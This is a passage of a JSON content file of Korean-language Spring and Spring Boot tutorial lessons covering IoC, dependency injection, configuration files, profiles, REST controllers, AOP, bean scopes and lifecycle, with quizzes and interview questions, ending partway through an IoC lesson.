{
  "01_기본/spring-ioc-di": {
    "id": "01_기본/spring-ioc-di",
    "title": "IoC와 DI (의존성 주입)",
    "category": "spring",
    "subCategory": "01_기본",
    "language": "Java",
    "description": "Spring의 핵심 개념인 IoC와 DI를 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "IoC (제어의 역전)와 DI (의존성 주입)",
        "content": "IoC는 객체 생성과 생명주기 관리를 개발자가 아닌 프레임워크(컨테이너)가 담당하는 것입니다. DI는 객체가 필요로 하는 의존성을 외부에서 주입받는 방식입니다. 이를 통해 결합도를 낮추고 테스트가 용이해집니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "DI 예제",
        "code": "// 1. 생성자 주입 (권장)\n@Service\npublic class OrderService {\n    private final OrderRepository orderRepository;\n    \n    @Autowired  // 생성자 1개면 생략 가능\n    public OrderService(OrderRepository orderRepository) {\n        this.orderRepository = orderRepository;\n    }\n}\n\n// 2. 필드 주입 (테스트 어려움)\n@Service\npublic class UserService {\n    @Autowired\n    private UserRepository userRepository;\n}\n\n// 3. Setter 주입\n@Service\npublic class ProductService {\n    private ProductRepository productRepository;\n    \n    @Autowired\n    public void setProductRepository(ProductRepository repo) {\n        this.productRepository = repo;\n    }\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. 생성자 주입 권장 (불변성, 테스트 용이)\\n2. final 키워드로 불변성 보장\\n3. @RequiredArgsConstructor (Lombok)로 간결하게"
      }
    ]
  },
  "01_입문/application-yml": {
    "id": "01_입문/application-yml",
    "title": "application.yml 설정",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "YAML",
    "description": "Spring Boot의 설정 파일 작성법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "application.yml",
        "content": "Spring Boot의 설정 파일로, 서버 포트, 데이터베이스 연결, 로깅 등을 설정합니다. .properties 대신 .yml 형식을 많이 사용합니다."
      },
      {
        "type": "code",
        "language": "YAML",
        "title": "설정 파일 예제",
        "code": "# application.yml\nserver:\n  port: 8080\n  servlet:\n    context-path: /api\n\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/mydb\n    username: root\n    password: password\n    driver-class-name: com.mysql.cj.jdbc.Driver\n  \n  jpa:\n    hibernate:\n      ddl-auto: update\n    show-sql: true\n    properties:\n      hibernate:\n        format_sql: true\n\nlogging:\n  level:\n    root: INFO\n    com.myapp: DEBUG"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. 들여쓰기 2칸 (YAML 문법)\\n2. 환경별 설정: application-{profile}.yml\\n3. 민감정보는 환경변수 사용: ${DB_PASSWORD}"
      }
    ]
  },
  "01_입문/profiles": {
    "id": "01_입문/profiles",
    "title": "Spring Profiles",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "Java",
    "description": "환경별 설정을 분리하는 Profiles 사용법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Profiles",
        "content": "Profiles는 개발/테스트/운영 등 환경별로 다른 설정을 적용할 수 있게 합니다. application-{profile}.yml 파일로 환경별 설정을 분리합니다."
      },
      {
        "type": "code",
        "language": "YAML",
        "title": "프로파일 설정 예제",
        "code": "# application.yml (공통)\nspring:\n  profiles:\n    active: dev  # 기본 프로파일\n\n---\n# application-dev.yml\nserver:\n  port: 8080\nspring:\n  datasource:\n    url: jdbc:h2:mem:devdb\n\n---\n# application-prod.yml\nserver:\n  port: 80\nspring:\n  datasource:\n    url: jdbc:mysql://prod-db:3306/mydb\n\n# 실행시 프로파일 지정\n# java -jar app.jar --spring.profiles.active=prod\n# 또는 환경변수: SPRING_PROFILES_ACTIVE=prod"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. dev, test, prod 환경 분리\\n2. 공통 설정은 application.yml에\\n3. VM 옵션: -Dspring.profiles.active=prod"
      }
    ]
  },
  "01_입문/project-structure": {
    "id": "01_입문/project-structure",
    "title": "프로젝트 구조",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "Java",
    "description": "Spring Boot 프로젝트의 표준 디렉토리 구조를 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Boot 프로젝트 구조",
        "content": "Spring Boot는 Convention over Configuration 원칙을 따르며, 표준 디렉토리 구조를 사용합니다. 계층형 또는 도메인형 구조로 패키지를 구성합니다."
      },
      {
        "type": "code",
        "language": "text",
        "title": "프로젝트 구조",
        "code": "src/\n├── main/\n│   ├── java/com/example/myapp/\n│   │   ├── MyApplication.java      # @SpringBootApplication\n│   │   ├── controller/             # REST 컨트롤러\n│   │   │   └── UserController.java\n│   │   ├── service/                # 비즈니스 로직\n│   │   │   └── UserService.java\n│   │   ├── repository/             # 데이터 접근\n│   │   │   └── UserRepository.java\n│   │   ├── domain/                 # 엔티티, DTO\n│   │   │   ├── User.java\n│   │   │   └── UserDto.java\n│   │   └── config/                 # 설정 클래스\n│   │       └── SecurityConfig.java\n│   └── resources/\n│       ├── application.yml         # 설정 파일\n│       ├── static/                 # 정적 파일\n│       └── templates/              # 템플릿 (Thymeleaf)\n└── test/                           # 테스트 코드"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. 계층형: controller/service/repository\\n2. 도메인형: user/order/product별 분리\\n3. @SpringBootApplication은 최상위 패키지에"
      }
    ]
  },
  "01_입문/quiz-intro": {
    "id": "01_입문/quiz-intro",
    "title": "Spring 입문 퀴즈",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "Java",
    "description": "Spring 입문 개념을 확인하는 퀴즈입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring 입문 퀴즈",
        "content": "다음 질문에 답해보세요:\\n\\nQ1. IoC가 의미하는 것은?\\nA) 인터페이스 지향 코딩\\nB) 제어의 역전\\nC) 입출력 제어\\n\\nQ2. 가장 권장되는 DI 방식은?\\nA) 필드 주입\\nB) Setter 주입\\nC) 생성자 주입\\n\\nQ3. Spring Boot의 설정 파일 이름은?\\nA) config.xml\\nB) application.yml\\nC) settings.json"
      },
      {
        "type": "tip",
        "title": "정답",
        "content": "Q1: B) 제어의 역전\\nQ2: C) 생성자 주입 (불변성, 테스트 용이)\\nQ3: B) application.yml 또는 application.properties"
      }
    ]
  },
  "01_입문/spring-intro": {
    "id": "01_입문/spring-intro",
    "title": "Spring 소개",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "Java",
    "description": "Spring Framework의 개요와 특징을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Framework란?",
        "content": "Spring은 Java 엔터프라이즈 애플리케이션 개발을 위한 오픈소스 프레임워크입니다. IoC/DI, AOP, MVC, 트랜잭션 관리 등을 제공하며, 모듈화된 구조로 필요한 기능만 선택 사용할 수 있습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "Spring Boot 시작하기",
        "code": "// 메인 클래스\n@SpringBootApplication\npublic class MyApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(MyApplication.class, args);\n    }\n}\n\n// 간단한 REST 컨트롤러\n@RestController\npublic class HelloController {\n    \n    @GetMapping(\"/hello\")\n    public String hello() {\n        return \"Hello, Spring Boot!\";\n    }\n}\n\n// 서비스\n@Service\npublic class GreetingService {\n    public String greet(String name) {\n        return \"Hello, \" + name + \"!\";\n    }\n}"
      },
      {
        "type": "tip",
        "title": "Spring 핵심 모듈",
        "content": "1. Spring Core: IoC/DI 컨테이너\\n2. Spring MVC: 웹 애플리케이션\\n3. Spring Data: 데이터 접근\\n4. Spring Security: 보안\\n5. Spring Boot: 자동 설정, 빠른 시작"
      }
    ]
  },
  "01_입문/spring-vs-springboot": {
    "id": "01_입문/spring-vs-springboot",
    "title": "Spring vs Spring Boot",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "Java",
    "description": "Spring Framework와 Spring Boot의 차이를 비교합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring vs Spring Boot",
        "content": "Spring Boot는 Spring Framework의 복잡한 설정을 자동화한 것입니다. XML 설정 없이 어노테이션 기반으로 빠르게 시작할 수 있고, 내장 톰캣으로 독립 실행 가능한 JAR를 만들 수 있습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "설정 비교",
        "code": "/* Spring (XML 설정 필요) */\n// applicationContext.xml\n<beans>\n    <bean id=\"userService\" class=\"com.example.UserService\">\n        <property name=\"userRepository\" ref=\"userRepository\"/>\n    </bean>\n</beans>\n\n/* Spring Boot (자동 설정) */\n// 어노테이션만으로 끝!\n@Service\npublic class UserService {\n    private final UserRepository userRepository;\n    \n    public UserService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n}\n\n// 내장 톰캣으로 바로 실행\n// java -jar myapp.jar"
      },
      {
        "type": "tip",
        "title": "Spring Boot 장점",
        "content": "1. 자동 설정 (Auto-configuration)\\n2. 내장 서버 (Tomcat, Jetty)\\n3. 스타터 의존성 (spring-boot-starter-*)\\n4. 운영 기능 (Actuator)\\n5. 빠른 시작 (start.spring.io)"
      }
    ]
  },
  "01_입문/springboot-start": {
    "id": "01_입문/springboot-start",
    "title": "Spring Boot 시작하기",
    "category": "spring",
    "subCategory": "01_입문",
    "language": "Java",
    "description": "Spring Boot 프로젝트 생성 및 실행 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Boot 시작하기",
        "content": "Spring Initializr(start.spring.io)로 프로젝트를 생성하고, IDE에서 import하여 개발을 시작합니다. Gradle 또는 Maven 빌드 도구를 사용합니다."
      },
      {
        "type": "code",
        "language": "Gradle",
        "title": "build.gradle",
        "code": "plugins {\n    id 'java'\n    id 'org.springframework.boot' version '3.2.0'\n    id 'io.spring.dependency-management' version '1.1.4'\n}\n\ngroup = 'com.example'\nversion = '0.0.1-SNAPSHOT'\njava.sourceCompatibility = '17'\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation 'org.springframework.boot:spring-boot-starter-web'\n    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'\n    runtimeOnly 'com.h2database:h2'\n    testImplementation 'org.springframework.boot:spring-boot-starter-test'\n}\n\n// 실행: ./gradlew bootRun\n// 빌드: ./gradlew build"
      },
      {
        "type": "tip",
        "title": "시작 단계",
        "content": "1. start.spring.io에서 프로젝트 생성\\n2. 의존성 선택 (Web, JPA, H2 등)\\n3. IDE에서 import\\n4. ./gradlew bootRun으로 실행\\n5. http://localhost:8080 접속"
      }
    ]
  },
  "02_심화/spring-rest-api": {
    "id": "02_심화/spring-rest-api",
    "title": "REST API 개발",
    "category": "spring",
    "subCategory": "02_심화",
    "language": "Java",
    "description": "Spring Boot로 RESTful API를 개발하는 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "REST API 개발",
        "content": "@RestController로 JSON 응답을 반환하는 API를 만듭니다. HTTP 메서드(GET, POST, PUT, DELETE)에 맞는 어노테이션을 사용하고, ResponseEntity로 상태 코드를 제어합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "REST Controller 예제",
        "code": "@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    private final UserService userService;\n    \n    public UserController(UserService userService) {\n        this.userService = userService;\n    }\n    \n    @GetMapping\n    public List<UserDto> getAll() {\n        return userService.findAll();\n    }\n    \n    @GetMapping(\"/{id}\")\n    public ResponseEntity<UserDto> getById(@PathVariable Long id) {\n        return userService.findById(id)\n            .map(ResponseEntity::ok)\n            .orElse(ResponseEntity.notFound().build());\n    }\n    \n    @PostMapping\n    public ResponseEntity<UserDto> create(@RequestBody @Valid UserDto dto) {\n        UserDto created = userService.create(dto);\n        return ResponseEntity.status(HttpStatus.CREATED).body(created);\n    }\n    \n    @DeleteMapping(\"/{id}\")\n    public ResponseEntity<Void> delete(@PathVariable Long id) {\n        userService.delete(id);\n        return ResponseEntity.noContent().build();\n    }\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. @RestController = @Controller + @ResponseBody\\n2. @PathVariable: URL 경로 변수\\n3. @RequestBody: JSON → 객체 변환\\n4. ResponseEntity: 상태 코드 + 헤더 + 본문"
      }
    ]
  },
  "02_핵심개념/annotation-basic": {
    "id": "02_핵심개념/annotation-basic",
    "title": "Spring 핵심 어노테이션",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "Spring에서 자주 사용하는 어노테이션을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring 핵심 어노테이션",
        "content": "Spring은 어노테이션 기반으로 빈 등록, DI, 웹 요청 매핑 등을 처리합니다. @Component 계열, @Autowired, @Controller/@Service/@Repository 등이 핵심입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "주요 어노테이션",
        "code": "// 빈 등록 어노테이션\n@Component      // 일반 컴포넌트\n@Service        // 비즈니스 로직 (Component와 동일)\n@Repository     // 데이터 접근 (예외 변환 기능)\n@Controller     // 웹 컨트롤러 (뷰 반환)\n@RestController // REST API (@Controller + @ResponseBody)\n@Configuration  // 설정 클래스\n\n// DI 어노테이션\n@Autowired      // 의존성 주입\n@Qualifier(\"beanName\")  // 특정 빈 지정\n@Primary        // 우선순위 빈\n\n// 웹 어노테이션\n@RequestMapping(\"/api\")  // URL 매핑\n@GetMapping, @PostMapping, @PutMapping, @DeleteMapping\n@PathVariable   // URL 경로 변수\n@RequestParam   // 쿼리 파라미터\n@RequestBody    // JSON → 객체\n\n// 검증 어노테이션\n@Valid          // 검증 활성화\n@NotNull, @NotEmpty, @Size, @Email"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. @Component 계열은 컴포넌트 스캔 대상\\n2. @Service, @Repository는 의미 구분용\\n3. @RestController = @Controller + @ResponseBody"
      }
    ]
  },
  "02_핵심개념/aop-pointcut": {
    "id": "02_핵심개념/aop-pointcut",
    "title": "AOP와 Pointcut",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "AOP 개념과 Pointcut 표현식을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "AOP (관점 지향 프로그래밍)",
        "content": "AOP는 로깅, 트랜잭션, 보안 등 횡단 관심사를 핵심 로직과 분리합니다. @Aspect로 공통 로직을 정의하고, Pointcut으로 적용 대상을 지정합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "AOP 예제",
        "code": "@Aspect\n@Component\npublic class LoggingAspect {\n    \n    // Pointcut: Service 계층 모든 메서드\n    @Pointcut(\"execution(* com.example.service.*.*(..))\")\n    public void serviceLayer() {}\n    \n    // Before: 메서드 실행 전\n    @Before(\"serviceLayer()\")\n    public void logBefore(JoinPoint jp) {\n        log.info(\"호출: {}\", jp.getSignature().getName());\n    }\n    \n    // After: 메서드 실행 후 (성공/실패 무관)\n    @After(\"serviceLayer()\")\n    public void logAfter(JoinPoint jp) {\n        log.info(\"완료: {}\", jp.getSignature().getName());\n    }\n    \n    // Around: 전후 모두 제어\n    @Around(\"serviceLayer()\")\n    public Object logAround(ProceedingJoinPoint pjp) throws Throwable {\n        long start = System.currentTimeMillis();\n        Object result = pjp.proceed();  // 실제 메서드 실행\n        log.info(\"실행시간: {}ms\", System.currentTimeMillis() - start);\n        return result;\n    }\n}"
      },
      {
        "type": "tip",
        "title": "Pointcut 표현식",
        "content": "execution(* com.example..*Service.*(..))\\n- *: 모든 반환타입\\n- com.example..: 패키지와 하위\\n- *Service: Service로 끝나는 클래스\\n- *: 모든 메서드\\n- (..): 모든 파라미터"
      }
    ]
  },
  "02_핵심개념/bean-basic": {
    "id": "02_핵심개념/bean-basic",
    "title": "Spring Bean 기초",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "Spring Bean의 개념과 등록 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Bean이란?",
        "content": "Bean은 Spring IoC 컨테이너가 관리하는 객체입니다. 싱글톤으로 생성되며, 컴포넌트 스캔(@Component)이나 @Bean 메서드로 등록합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "Bean 등록 방법",
        "code": "// 1. 컴포넌트 스캔 (자동)\n@Service\npublic class UserService {\n    // @Service, @Component 등이 붙으면 자동 등록\n}\n\n// 2. @Bean 메서드 (수동)\n@Configuration\npublic class AppConfig {\n    \n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n    \n    @Bean(\"customService\")\n    public MyService myService() {\n        return new MyServiceImpl();\n    }\n}\n\n// Bean 스코프\n@Scope(\"singleton\")  // 기본값: 하나의 인스턴스\n@Scope(\"prototype\")  // 요청마다 새 인스턴스\n@Scope(\"request\")    // HTTP 요청마다\n@Scope(\"session\")    // HTTP 세션마다\n\n// Bean 조회\n@Autowired\nprivate ApplicationContext ctx;\nMyService service = ctx.getBean(MyService.class);"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. 기본 스코프는 싱글톤\\n2. @Component: 컴포넌트 스캔 대상\\n3. @Bean: 외부 라이브러리 등록 시 사용\\n4. @Configuration: @Bean 메서드 포함 클래스"
      }
    ]
  },
  "02_핵심개념/bean-lifecycle": {
    "id": "02_핵심개념/bean-lifecycle",
    "title": "Bean 생명주기",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "스프링 빈의 생성부터 소멸까지 전체 생명주기를 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Bean 생명주기란?",
        "content": "스프링 빈은 '생성 → 의존관계 주입 → 초기화 → 사용 → 소멸' 순서로 생명주기를 가집니다. 초기화와 소멸 시점에 특정 로직을 실행할 수 있습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "생명주기 콜백 예제",
        "code": "@Component\npublic class DatabaseConnection {\n    \n    @PostConstruct  // 의존관계 주입 완료 후 호출\n    public void init() {\n        System.out.println(\"DB 연결 초기화\");\n    }\n    \n    @PreDestroy  // 빈 소멸 직전 호출\n    public void close() {\n        System.out.println(\"DB 연결 종료\");\n    }\n}\n\n// 또는 InitializingBean, DisposableBean 구현\n@Component\npublic class CacheService implements InitializingBean, DisposableBean {\n    @Override\n    public void afterPropertiesSet() { /* 초기화 */ }\n    \n    @Override\n    public void destroy() { /* 소멸 */ }\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. @PostConstruct - 가장 권장되는 초기화 방법\\n2. @PreDestroy - 가장 권장되는 소멸 방법\\n3. 생성자에서 무거운 초기화 로직은 피하기\\n4. 프로토타입 빈은 @PreDestroy 호출 안됨"
      }
    ]
  },
  "02_핵심개념/bean-scope": {
    "id": "02_핵심개념/bean-scope",
    "title": "Bean Scope",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "스프링 빈 스코프(Singleton, Prototype, Request, Session)를 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Bean Scope란?",
        "content": "스코프는 빈이 존재할 수 있는 범위입니다. 기본값은 싱글톤으로, 애플리케이션 전체에서 하나의 인스턴스만 생성됩니다. 프로토타입은 요청할 때마다 새 인스턴스를 생성합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "스코프 종류",
        "code": "// 1. Singleton (기본값) - 애플리케이션당 1개\n@Component\n@Scope(\"singleton\")\npublic class SingletonBean {}\n\n// 2. Prototype - 요청마다 새로 생성\n@Component\n@Scope(\"prototype\")\npublic class PrototypeBean {}\n\n// 3. Request - HTTP 요청당 1개 (웹)\n@Component\n@Scope(value = \"request\", proxyMode = ScopedProxyMode.TARGET_CLASS)\npublic class RequestBean {}\n\n// 4. Session - HTTP 세션당 1개 (웹)\n@Component\n@Scope(value = \"session\", proxyMode = ScopedProxyMode.TARGET_CLASS)\npublic class SessionBean {}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. 99%는 싱글톤으로 충분\\n2. Prototype은 스프링이 생성만 관리 (소멸 X)\\n3. Request/Session은 웹 환경에서만 사용\\n4. 싱글톤에 프로토타입 주입 시 Provider 사용"
      }
    ]
  },
  "02_핵심개념/component-scan": {
    "id": "02_핵심개념/component-scan",
    "title": "Component Scan",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "컴포넌트 스캔으로 빈을 자동 등록하는 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Component Scan이란?",
        "content": "@Component가 붙은 클래스를 자동으로 찾아 스프링 빈으로 등록합니다. @SpringBootApplication에 @ComponentScan이 포함되어 있어, 해당 패키지와 하위 패키지를 자동 스캔합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "컴포넌트 스캔 예제",
        "code": "// @Component 계열 어노테이션\n@Component   // 일반 컴포넌트\n@Service     // 비즈니스 로직\n@Repository  // 데이터 접근 계층\n@Controller  // 웹 컨트롤러\n\n// 스캔 범위 지정\n@Configuration\n@ComponentScan(\n    basePackages = \"com.example\",\n    excludeFilters = @ComponentScan.Filter(\n        type = FilterType.ANNOTATION,\n        classes = Configuration.class\n    )\n)\npublic class AppConfig {}\n\n// Spring Boot는 자동으로 메인 클래스 패키지 기준 스캔\n@SpringBootApplication  // @ComponentScan 포함\npublic class MyApplication {}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. 메인 클래스는 루트 패키지에 위치시키기\\n2. @Service, @Repository는 @Component의 특수화\\n3. 빈 이름은 클래스명의 첫 글자 소문자\\n4. @Bean은 수동 등록, @Component는 자동 등록"
      }
    ]
  },
  "02_핵심개념/configuration": {
    "id": "02_핵심개념/configuration",
    "title": "@Configuration 클래스",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "@Configuration과 @Bean을 사용한 수동 빈 등록 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "@Configuration이란?",
        "content": "@Configuration은 스프링 설정 클래스임을 나타냅니다. 이 클래스 안에서 @Bean 메서드로 빈을 수동 등록할 수 있습니다. 외부 라이브러리나 복잡한 초기화가 필요한 빈을 등록할 때 사용합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "@Configuration 예제",
        "code": "@Configuration\npublic class AppConfig {\n    \n    // 외부 라이브러리 빈 등록\n    @Bean\n    public ObjectMapper objectMapper() {\n        return new ObjectMapper()\n            .registerModule(new JavaTimeModule())\n            .disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);\n    }\n    \n    // 조건부 빈 등록\n    @Bean\n    @Profile(\"dev\")\n    public DataSource devDataSource() {\n        return new H2DataSource();\n    }\n    \n    @Bean\n    @Profile(\"prod\")\n    public DataSource prodDataSource() {\n        return new MySQLDataSource();\n    }\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. @Bean은 메서드 이름이 빈 이름이 됨\\n2. CGLIB 프록시로 싱글톤 보장\\n3. 외부 라이브러리 = @Bean, 내 코드 = @Component\\n4. @Bean(name = \"이름\")으로 이름 지정 가능"
      }
    ]
  },
  "02_핵심개념/di-concept": {
    "id": "02_핵심개념/di-concept",
    "title": "DI(의존성 주입) 개념",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "의존성 주입(Dependency Injection)의 개념과 장점을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "DI란 무엇인가?",
        "content": "의존성 주입(DI)은 객체가 필요로 하는 의존 객체를 외부에서 주입받는 것입니다. 객체가 직접 의존 객체를 생성하지 않고, 스프링 컨테이너가 대신 생성하여 주입해줍니다. 이를 통해 결합도를 낮추고 테스트가 용이해집니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "DI 전/후 비교",
        "code": "// ❌ DI 없이 직접 생성 (강한 결합)\npublic class OrderService {\n    private final PaymentService payment = new KakaoPayService(); // 변경 어려움\n}\n\n// ✅ DI 적용 (느슨한 결합)\n@Service\npublic class OrderService {\n    private final PaymentService payment;\n    \n    @Autowired  // 스프링이 주입\n    public OrderService(PaymentService payment) {\n        this.payment = payment;\n    }\n}\n\n// 테스트 시 Mock 주입 가능\n@Test\nvoid testOrder() {\n    PaymentService mockPayment = mock(PaymentService.class);\n    OrderService service = new OrderService(mockPayment);\n}"
      },
      {
        "type": "tip",
        "title": "DI의 장점",
        "content": "1. 결합도 감소 - 구현체 변경이 쉬움\\n2. 테스트 용이 - Mock 객체 주입 가능\\n3. 코드 재사용성 증가\\n4. 유지보수성 향상"
      }
    ]
  },
  "02_핵심개념/di-constructor": {
    "id": "02_핵심개념/di-constructor",
    "title": "생성자 주입",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "생성자를 통한 의존성 주입 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "생성자 주입이란?",
        "content": "생성자를 통해 의존 객체를 주입받는 방식입니다. 스프링 공식 권장 방식이며, final 필드와 함께 사용하여 불변성을 보장합니다. 생성자가 하나면 @Autowired 생략 가능합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "생성자 주입 예제",
        "code": "// 기본 생성자 주입\n@Service\npublic class OrderService {\n    private final MemberRepository memberRepository;\n    private final OrderRepository orderRepository;\n    \n    // 생성자가 1개면 @Autowired 생략 가능\n    public OrderService(MemberRepository memberRepository,\n                        OrderRepository orderRepository) {\n        this.memberRepository = memberRepository;\n        this.orderRepository = orderRepository;\n    }\n}\n\n// Lombok으로 간결하게\n@Service\n@RequiredArgsConstructor  // final 필드 생성자 자동 생성\npublic class OrderService {\n    private final MemberRepository memberRepository;\n    private final OrderRepository orderRepository;\n}"
      },
      {
        "type": "tip",
        "title": "생성자 주입 장점",
        "content": "1. final 키워드로 불변성 보장\\n2. 순환 참조 컴파일 시점 감지\\n3. 테스트 시 의존성 명확\\n4. NullPointerException 방지"
      }
    ]
  },
  "02_핵심개념/di-types": {
    "id": "02_핵심개념/di-types",
    "title": "DI 주입 방식 비교",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "생성자, 세터, 필드 주입 방식의 차이를 비교합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "3가지 DI 방식",
        "content": "스프링은 생성자 주입, 세터 주입, 필드 주입 세 가지 방식을 지원합니다. 생성자 주입이 공식 권장 방식이며, 필드 주입은 테스트가 어려워 권장하지 않습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "3가지 주입 방식",
        "code": "// 1. 생성자 주입 (✅ 권장)\n@Service\npublic class UserService {\n    private final UserRepository userRepository;\n    \n    public UserService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n}\n\n// 2. 세터 주입 (선택적 의존성에 사용)\n@Service\npublic class UserService {\n    private UserRepository userRepository;\n    \n    @Autowired\n    public void setUserRepository(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n}\n\n// 3. 필드 주입 (❌ 권장하지 않음)\n@Service\npublic class UserService {\n    @Autowired\n    private UserRepository userRepository;  // 테스트 어려움\n}"
      },
      {
        "type": "tip",
        "title": "방식별 특징",
        "content": "생성자 주입: 불변, 필수 의존성, 테스트 용이\\n세터 주입: 선택적 의존성, 변경 가능\\n필드 주입: 간결하지만 테스트/DI 프레임워크 없이 사용 불가"
      }
    ]
  },
  "02_핵심개념/interview-core": {
    "id": "02_핵심개념/interview-core",
    "title": "Spring 핵심 면접 질문",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "Spring 핵심 개념 관련 면접 질문과 답변을 정리합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "자주 나오는 면접 질문",
        "content": "Q1. IoC와 DI의 차이?\\nA: IoC는 제어의 역전 원칙, DI는 IoC를 구현하는 방법\\n\\nQ2. @Component vs @Bean?\\nA: @Component는 클래스에, @Bean은 메서드에 사용. 외부 라이브러리는 @Bean\\n\\nQ3. 생성자 주입을 권장하는 이유?\\nA: 불변성 보장, 순환참조 방지, 테스트 용이\\n\\nQ4. 스프링 빈은 기본적으로 어떤 스코프?\\nA: 싱글톤. 애플리케이션 당 하나의 인스턴스"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "면접 예상 코드",
        "code": "// Q: 아래 코드의 문제점은?\n@Service\npublic class OrderService {\n    @Autowired\n    private PaymentService paymentService;  // 필드 주입\n}\n\n// A: 필드 주입은 테스트가 어렵고, final 불가\n// 생성자 주입으로 변경해야 함\n@Service\n@RequiredArgsConstructor\npublic class OrderService {\n    private final PaymentService paymentService;\n}"
      },
      {
        "type": "tip",
        "title": "면접 TIP",
        "content": "1. 왜?를 설명할 수 있어야 함\\n2. 실무 경험과 연결지어 답변\\n3. 트레이드오프 언급하면 좋음\\n4. 모르면 모른다고 솔직히"
      }
    ]
  },
  "02_핵심개념/ioc-concept": {
    "id": "02_핵심개념/ioc-concept",
    "title": "IoC (제어의 역전)",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "IoC(Inversion of Control) 개념과 스프링 컨테이너를 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "IoC란 무엇인가?",
        "content": "IoC(제어의 역전)은 객체의 생성과 생명주기 관리를 개발자가 아닌 프레임워크(스프링 컨테이너)가 담당하는 것입니다. 개발자는 비즈니스 로직에만 집중하고, 객체 관리는 스프링에 위임합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "IoC 전/후 비교",
